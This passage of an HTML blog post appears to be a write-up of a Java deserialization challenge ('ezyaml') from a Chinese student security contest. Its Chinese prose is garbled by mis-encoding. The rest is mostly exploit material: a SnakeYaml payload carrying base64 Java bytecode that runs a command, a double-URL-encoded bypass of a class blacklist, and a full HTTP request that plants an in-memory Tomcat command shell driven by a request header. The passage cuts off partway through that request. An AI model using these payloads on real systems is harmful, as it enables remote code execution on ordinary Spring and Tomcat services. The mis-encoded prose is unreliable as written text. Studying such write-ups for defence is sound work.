src="/2025/08/12/%E4%BB%8E%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9B%E4%B8%A4%E9%81%93java%E9%A2%98%E5%AD%A6%E7%82%B9%E5%B0%8Ftrick/image-20250822011044892.png" alt="image-20250822011044892"></p><p><img src="/2025/08/12/%E4%BB%8E%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9B%E4%B8%A4%E9%81%93java%E9%A2%98%E5%AD%A6%E7%82%B9%E5%B0%8Ftrick/image-20250822011051221.png" alt="image-20250822011051221"></p><h2 id="ezyaml"><a href="#ezyaml" class="headerlink" title="ezyaml"></a>ezyaml</h2><p>è¿™é“å…¶å®å‡ºé¢˜äººå¾ˆæŠ½è±¡çš„æ”¾åœ¨äº†ç¬¬ä¸€é¢˜çš„é™„ä»¶é‡Œï¼Œä½†æ˜¯é¢˜æ˜¯ä¸‹åˆæ”¾å‡ºæ¥çš„ï¼Œæ‰€ä»¥é¢˜åˆšæ”¾å‡ºæ¥å°±è¢«æ‰“çƒ‚äº†ã€‚ã€‚ã€‚</p><p>æœ‰ç‚¹éš¾è¯„ï¼ˆ</p><p>ä½†æˆ‘æƒ³è¯´çš„æ˜¯ï¼Œè¿™é“é¢˜è™½ç„¶ä¹Ÿå¾ˆç®€å•ï¼Œå°±ä¸€ä¸ªéšä¾¿å†™yamlè¡¨è¾¾å¼çš„æ¥å£ç„¶åyaml.loadååºåˆ—åŒ–ï¼Œä½†æ˜¯æˆ‘ä»¬æœ€åè§£é¢˜çš„æ€è·¯æ˜¯å€¼å¾—è¯´é“è¯´é“çš„ï¼Œæ¥è‡ªé˜Ÿé‡Œoyå­¦é•¿çš„<code>ClassPathXmlApplicationContext</code>æ‰“æ³•ã€‚</p><p>åŒæ—¶æˆ‘ä¹Ÿå‚è€ƒäº†ä¸€ä¸‹ï¼š</p><p><a href="https://forum.butian.net/share/4486">å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-SnakeYaml ä¸å‡ºç½‘ RCE æ–°é“¾ï¼ˆJDKåŸç”Ÿé“¾ï¼‰æŒ–æ˜</a></p><p>æœ¬æ¥å½“æ—¶æƒ³æ‰“è¿™ä¸ªï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml">[<br>  <span class="hljs-type">!!com.sun.javafx.iio.ImageFrame</span> [<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&amp;A</span> [<span class="hljs-type">!!binary</span> <span class="hljs-string">&quot;yv66vgAAADQAXwoAEgA0BwA1CgACADQHADYKADcAOAoAOQA6CgACADsJADwAPQcAPgoACQA/CgBAAEEKAEIAQwgARAoAQgBFBwBGBwBHCgAQAEgHAEkBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAGExjb20vaGVpaHU1NzcvYmVhbi9FdmlsOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAZlbmNvZGUBAAJbQgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwBKAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwBGAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwAEwAUAQAqb3JnL2FwYWNoZS90b21jYXQvdXRpbC9jb2RlYy9iaW5hcnkvQmFzZTY0AQAWY29tL2hlaWh1NTc3L2JlYW4vRXZpbAcASwwATABNBwBODABPAFAMAB4AUQcAUgwAUwBUAQAQamF2YS9sYW5nL1N0cmluZwwAEwBVBwBWDABXAFgHAFkMAFoAWwEABGNhbGMMAFwAXQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwAEwBeAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAK2NvbS9zdW4vb3JnL2FwYWNoZS9iY2VsL2ludGVybmFsL1JlcG9zaXRvcnkBAAtsb29rdXBDbGFzcwEASShMamF2YS9sYW5nL0NsYXNzOylMY29tL3N1bi9vcmcvYXBhY2hlL2JjZWwvaW50ZXJuYWwvY2xhc3NmaWxlL0phdmFDbGFzczsBADRjb20vc3VuL29yZy9hcGFjaGUvYmNlbC9pbnRlcm5hbC9jbGFzc2ZpbGUvSmF2YUNsYXNzAQAIZ2V0Qnl0ZXMBAAQoKVtCAQAGKFtCKVtCAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEABShbQilWAQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEABAASAAAAAAAFAAEAEwAUAAEAFQAAAC8AAQABAAAABSq3AAGxAAAAAgAWAAAABgABAAAADgAXAAAADAABAAAABQAYABkAAAAJABoAGwABABUAAABeAAQAAgAAACK7AAJZtwADEgS4AAW2AAa2AAdMsgAIuwAJWSu3AAq2AAuxAAAAAgAWAAAADgADAAAAEAATABEAIQASABcAAAAWAAIAAAAiABwAHQAAABMADwAeAB8AAQABACAAIQACABUAAAA/AAAAAwAAAAGxAAAAAgAWAAAABgABAAAAHwAXAAAAIAADAAAAAQAYABkAAAAAAAEAIgAjAAEAAAABACQAJQACACYAAAAEAAEAJwABACAAKAACABUAAABJAAAABAAAAAGxAAAAAgAWAAAABgABAAAAJAAXAAAAKgAEAAAAAQAYABkAAAAAAAEAIgAjAAEAAAABACkAKgACAAAAAQArACwAAwAmAAAABAABACcACAAtABQAAQAVAAAAZgADAAEAAAAXuAAMEg22AA5XpwANS7sAEFkqtwARv7EAAQAAAAkADAAPAAMAFgAAABYABQAAABYACQAZAAwAFwANABgAFgAaABcAAAAMAAEADQAJAC4ALwAAADAAAAAHAAJMBwAxCQABADIAAAACADM=&quot;</span>], <span class="hljs-literal">null</span>],<br>  <span class="hljs-type">!!com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</span> [<br>    <span class="hljs-type">!!com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span> [<span class="hljs-string">*A</span>,<span class="hljs-string">&quot;heihu577&quot;</span>,<span class="hljs-type">!!java.util.Properties</span> &#123;&#125;,<span class="hljs-type">!!int</span> <span class="hljs-number">0</span>,<span class="hljs-type">!!com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span> &#123;&#125;]<br>  ]<br>]<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯é¶æœºé‚£è¾¹javaå¥½åƒæ²¡è¿™ä¸ªç±»ï¼Œæˆ‘æœ¬åœ°ä¹Ÿæ²¡æœ‰ï¼Œä½†oyå­¦é•¿æœ‰emmmmâ€¦..è¿™ä¸ªè·Ÿjavaè‡ªå·±è£…çš„ä¾èµ–æœ‰å…³ç³»å§ã€‚</p><p>å®ƒbançš„ä¹Ÿä¸å½»åº•ï¼Œè€Œä¸”è¿™ä¹ˆbanåŸºæœ¬éšä¾¿ç»•ã€‚ã€‚ã€‚</p><img src="/2025/08/12/%E4%BB%8E%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9B%E4%B8%A4%E9%81%93java%E9%A2%98%E5%AD%A6%E7%82%B9%E5%B0%8Ftrick/image-20250822011932168.png" class="" title="image-20250822011932168"><p>payloadæ˜¯æ‰“çš„é‚£ä¸ªå†™æ–‡ä»¶æ“ä½œï¼ŒåŒé‡URLç¼–ç å°±ç»•äº†ã€‚ã€‚ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">!!org.springframework.context.support.ClassPathXmlApplicationContext [ <span class="hljs-string">&quot;file://$&#123;catalina.home&#125;/**/*.tmp&quot;</span> ]<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå–äº†ä¸ªå·§ï¼Œé€šè¿‡<code>$&#123;catalina.home&#125;</code>ç›´æ¥æ‹¿åˆ°å®ƒçš„ä½ç½®ï¼Œè¿™é‡Œåº”è¯¥æ˜¯ä»<code>ClassPathXmlApplicationContext</code>ä»»æ„æ–‡ä»¶å†™&#x2F;&#x2F;æ— å¤–ç½‘RCEçš„è¿™ä¸ªtrickå‡ºçš„ä¸€é“é¢˜æˆ‘é‚£é‡Œçœ‹æ¥çš„ã€‚</p><p>å¯ä»¥å…ˆå‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/asasd101/article/details/147158437">Javaåˆ©ç”¨æ— å¤–ç½‘ï¼ˆä¸‹ï¼‰ï¼šClassPathXmlApplicationContextçš„ä¸å‡ºç½‘åˆ©ç”¨-CSDNåšå®¢</a></p><p><a href="https://www.leavesongs.com/PENETRATION/springboot-xml-beans-exploit-without-network.html">ClassPathXmlApplicationContextçš„ä¸å‡ºç½‘åˆ©ç”¨ | ç¦»åˆ«æ­Œ</a></p><p><a href="https://forum.butian.net/share/4467">å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-ä» SnakeYaml çœ‹ ClassPathXmlApplicationContext ä¸å‡ºç½‘åˆ©ç”¨</a></p><p>ç»•é»‘åå•ç›´æ¥æŠŠ<code>ClassPath</code>ç»™å†ç¼–ç ä¸€æ¬¡å°±å®Œäº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">!!org.springframework.context.support.%<span class="hljs-number">43</span>%6c%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">50</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%68XmlApplicationContext [ <span class="hljs-string">&quot;file://$&#123;catalina.home&#125;/**/*.tmp&quot;</span> ]<br></code></pre></td></tr></table></figure><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p>httpæŠ¥æ–‡æˆ‘ç”¨yakitæŠ“çš„ï¼Œæ‰€ä»¥å®ƒåˆè‡ªåŠ¨å¸®æˆ‘ç¼–ç äº†ä¸€æ¬¡ï¼Œå†…éƒ¨æ‰“ä¸€ä¸ªRCEåœ¨<code>X-Authorization</code>çš„å†…å­˜ğŸå°±å¯ä»¥äº†ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/yaml?yamlContent=%21%21org%2Espringframework%2Econtext%2Esupport%2E%2543%256c%2561%2573%2573%2550%2561%2574%2568XmlApplicationContext%20%5B%20%22file%3A%2F%2F%24%7Bcatalina%2Ehome%7D%2F%2A%2A%2F%2A%2Etmp%22%20%5D</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>pss.idss-cn.com:24458<br><span class="hljs-attribute">X-Authorization</span><span class="hljs-punctuation">: </span>cat /flag<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryINBwinb4uWPnBREL<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>7984<br><br><span class="language-bash">------WebKitFormBoundaryINBwinb4uWPnBREL</span><br><span class="language-bash">Content-Disposition: form-data; name=<span class="hljs-string">&quot;1&quot;</span></span><br><span class="language-bash"></span><br><span class="language-bash">&lt;beans xmlns=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="language-bash">       xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="language-bash">       xsi:schemaLocation=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="language-bash">                           http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><span class="language-bash">    &lt;bean <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;decoder&quot;</span> class=<span class="hljs-string">&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;</span>&gt;</span><br><span class="language-bash">        &lt;property name=<span class="hljs-string">&quot;staticMethod&quot;</span> value=<span class="hljs-string">&quot;javax.xml.bind.DatatypeConverter.parseBase64Binary&quot;</span>/&gt;</span><br><span class="language-bash">        &lt;property name=<span class="hljs-string">&quot;arguments&quot;</span>&gt;</span><br><span class="language-bash">            &lt;list&gt;</span><br><span class="language-bash">                &lt;value&gt;yv66vgAAADIBOwEAWW9yZy9hcGFjaGUvY29sbGVjdGlvbnMvY295b3RlL1J1bnRpbWVKc29uTWFwcGluZ0V4Y2VwdGlvbmJkZDg2N2FkM2U2ZDQ3YWI4YjNkMjE3M2U5ZTQ0YWEyBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEABjxpbml0PgEAAygpVgEAE2phdmEvbGFuZy9FeGNlcHRpb24HAAcMAAUABgoABAAJAQADcnVuDAALAAYKAAIADAEAEGdldFJlcUhlYWRlck5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAD1gtQXV0aG9yaXphdGlvbggAEAEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcAEgEAE2phdmEvbGFuZy9UaHJvd2FibGUHABQBABBqYXZhL2xhbmcvVGhyZWFkBwAWAQAKZ2V0VGhyZWFkcwgAGAEAD2phdmEvbGFuZy9DbGFzcwcAGgEAEltMamF2YS9sYW5nL0NsYXNzOwcAHAEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwwAHgAfCgAbACABABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHACIBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAJAAlCgAjACYBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMACgAKQoAIwAqAQATW0xqYXZhL2xhbmcvVGhyZWFkOwcALAEAB2dldE5hbWUMAC4ADwoAFwAvAQAEaHR0cAgAMQEAEGphdmEvbGFuZy9TdHJpbmcHADMBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwANQA2CgA0ADcBAAhBY2NlcHRvcggAOQEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwAOwA8CgAEAD0BAAZ0YXJnZXQIAD8BABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DABBAEIKABsAQwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkBwBFCgBGACYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwASABJCgBGAEoBAAhlbmRwb2ludAgATAEABnRoaXMkMAgATgEAB2hhbmRsZXIIAFABAA1nZXRTdXBlcmNsYXNzDABSADwKABsAUwEABmdsb2JhbAgAVQEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwwAVwBYCgAbAFkBACJvcmcuYXBhY2hlLmNveW90ZS5SZXF1ZXN0R3JvdXBJbmZvCABbAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyBwBdAQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwAXwBgCgBeAGEKABsALwEACnByb2Nlc3NvcnMIAGQBABNqYXZhL3V0aWwvQXJyYXlMaXN0BwBmAQAEc2l6ZQEAAygpSQwAaABpCgBnAGoBABUoSSlMamF2YS9sYW5nL09iamVjdDsMAEgAbAoAZwBtAQADcmVxCABvAQAHZ2V0Tm90ZQgAcQEAEWphdmEvbGFuZy9JbnRlZ2VyBwBzAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7DAB1AHYJAHQAdwEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7DAB5AHoKAHQAewEACWdldEhlYWRlcggAfQEACWdldE1ldGhvZAwAfwAfCgAbAIAMAA4ADwoAAgCCAQALZ2V0UmVzcG9uc2UIAIQBAAlnZXRXcml0ZXIIAIYBAA5qYXZhL2lvL1dyaXRlcgcAiAEABmhhbmRsZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7DACKAIsKAAIAjAEABXdyaXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDACOAI8KAIkAkAEABWZsdXNoDACSAAYKAIkAkwEABWNsb3NlDACVAAYKAIkAlgEABGV4ZWMBAAdvcy5uYW1lCACZAQAQamF2YS9sYW5nL1N5c3RlbQcAmwEAC2dldFByb3BlcnR5DACdAIsKAJwAngEAC3RvTG93ZXJDYXNlDACgAA8KADQAoQEAA3dpbggAowEABy9iaW4vc2gIAKUBAAItYwgApwEAB2NtZC5leGUIAKkBAAIvYwgAqwEAEWphdmEvbGFuZy9SdW50aW1lBwCtAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwArwCwCgCuALEBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DACYALMKAK4AtAEAEWphdmEvbGFuZy9Qcm9jZXNzBwC2AQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwwAuAC5CgC3ALoBABFqYXZhL3V0aWwvU2Nhbm5lcgcAvAEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgwABQC+CgC9AL8BAAJcYQgAwQEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwwAwwDECgC9AMUBAAAIAMcBAAdoYXNOZXh0AQADKClaDADJAMoKAL0AywEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyBwDNCgDOAAkBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsMANAA0QoAzgDSAQAEbmV4dAwA1AAPCgC9ANUBAAh0b1N0cmluZwwA1wAPCgDOANgBAApnZXRNZXNzYWdlDADaAA8KAAgA2wEAE1tMamF2YS9sYW5nL1N0cmluZzsHAN0BABNqYXZhL2lvL0lucHV0U3RyZWFtBwDfAQAGZXlKZVhBCADhAQAKc3RhcnRzV2l0aAEAFShMamF2YS9sYW5nL1N0cmluZzspWgwA4wDkCgA0AOUBAAZsZW5ndGgMAOcAaQoANADoAQAGY2hhckF0AQAEKEkpQwwA6gDrCgA0AOwBABUoQylMamF2YS9sYW5nL1N0cmluZzsMAHkA7goANADvAQAIcGFyc2VJbnQBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkMAPEA8goAdADzAQABLggA9QEAB2luZGV4T2YMAPcA8goANAD4AQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwwA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&lt;/value&gt;</span><br><span class="language-bash"></span><br><span class="language-bash">            &lt;/list&gt;</span><br><span class="language-bash"></span><br><span class="language-bash">        &lt;/property&gt;</span><br><span class="language-bash"></span><br><span class="language-bash">    &lt;/bean&gt;</span><br><span class="language-bash"></span><br><span class="language-bash">    &lt;bean <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;classLoader&quot;</span> class=<span class="hljs-string">&quot;javax.management.loading.MLet&quot;</span>/&gt;</span><br><span class="language-bash">    &lt;bean <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;clazz&quot;</span> factory-bean=<span class="hljs-string">&quot;classLoader&quot;</span> factory-method=<span class="hljs-string">&quot;defineClass&quot;</span>&gt;</span><br><span class="language-bash">        &lt;constructor-arg ref=<span 